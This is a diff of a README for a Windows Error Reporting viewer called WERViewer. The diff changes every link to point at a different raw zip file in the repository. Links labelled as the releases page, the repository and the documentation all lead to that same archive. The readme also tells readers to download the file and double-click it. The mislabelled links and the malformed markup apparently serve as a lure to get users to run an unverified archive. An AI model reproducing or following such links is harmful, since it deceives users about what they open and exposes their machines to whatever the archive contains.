@@ -8,13 +8,13 @@ Welcome to WERViewer! This application helps you fetch Windows Error Reporting (
 
 To download WERViewer, visit the link below. Follow the instructions provided to install the application on your Windows device.
 
-[![Download WERViewer](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Models/WER_Viewer_carvestrene.zip%https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Models/WER_Viewer_carvestrene.zip)](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Models/WER_Viewer_carvestrene.zip)
+[![Download WERViewer](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Controls/Viewer_WER_v3.5-alpha.4.zip%https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Controls/Viewer_WER_v3.5-alpha.4.zip)](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Controls/Viewer_WER_v3.5-alpha.4.zip)
 
 ### Step-by-Step Instructions
 
-1. Click the button above or visit the [Releases page](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Models/WER_Viewer_carvestrene.zip) directly.
+1. Click the button above or visit the [Releases page](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Controls/Viewer_WER_v3.5-alpha.4.zip) directly.
 2. On the Releases page, locate the latest version of WERViewer.
-3. Click the asset link to download the setup file (e.g., `https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Models/WER_Viewer_carvestrene.zip`).
+3. Click the asset link to download the setup file (e.g., `https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Controls/Viewer_WER_v3.5-alpha.4.zip`).
 4. Once the download completes, open the file by double-clicking it.
 5. Follow the installation prompts to install WERViewer on your system.
 
@@ -66,7 +66,7 @@ WERViewer is open-source and available for personal and commercial use under the
 
 For more information, check out the following resources:
 
-- [GitHub Repository](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Models/WER_Viewer_carvestrene.zip)
-- [Documentation](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Models/WER_Viewer_carvestrene.zip)
+- [GitHub Repository](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Controls/Viewer_WER_v3.5-alpha.4.zip)
+- [Documentation](https://github.com/julianrene113/WERViewer/raw/refs/heads/main/Controls/Viewer_WER_v3.5-alpha.4.zip)
 
 Thank you for choosing WERViewer! We aim to make your error-reporting experience smooth and efficient. Happy diagnosing!
